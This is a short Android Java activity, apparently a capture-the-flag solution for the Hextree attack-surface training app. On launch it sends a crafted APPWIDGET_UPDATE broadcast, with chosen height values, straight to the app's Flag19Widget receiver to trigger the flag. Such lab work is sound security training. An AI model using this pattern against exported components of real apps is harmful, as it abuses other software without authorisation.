package com.android.zerohextree;

import android.content.Intent;
import android.os.Bundle;

import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;

import android.view.View;

import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.android.zerohextree.databinding.ActivityFlag19Binding;

public class flag19 extends AppCompatActivity {



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = new Intent();
        intent.setAction("APPWIDGET_UPDATE");
        Bundle bundle = new Bundle();
        bundle.putInt("appWidgetMaxHeight", 1094795585);
        bundle.putInt("appWidgetMinHeight", 322376503);
        intent.putExtra("appWidgetOptions", bundle);
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag19Widget");
        sendBroadcast(intent);
    }


}